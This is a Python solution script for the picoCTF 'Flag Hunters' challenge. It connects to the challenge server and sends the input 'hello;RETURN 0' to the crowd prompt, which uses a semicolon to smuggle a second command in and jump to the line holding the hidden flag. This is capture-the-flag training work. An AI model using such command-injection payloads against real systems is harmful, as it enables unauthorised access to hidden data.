#!/usr/bin/env python3
"""Flag Hunters - picoCTF
Exploit the CROWD input handler to inject 'RETURN 0' via semicolon,
jumping to line 0 which contains the secret_intro with the flag."""

import socket

HOST = "verbal-sleep.picoctf.net"
PORT = 57967

s = socket.socket()
s.settimeout(15)
s.connect((HOST, PORT))

buf = b""
input_sent = False
flag = None

while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
        text = buf.decode(errors="replace")

        if "Crowd:" in text and not input_sent:
            # Inject RETURN 0 via semicolon in the crowd input
            s.sendall(b"hello;RETURN 0\n")
            input_sent = True
            buf = b""

        if "picoCTF" in text:
            for line in text.split("\n"):
                if "picoCTF" in line:
                    flag = line.strip()
            break
    except socket.timeout:
        break

s.close()
print(f"Flag: {flag}" if flag else "Flag not found")
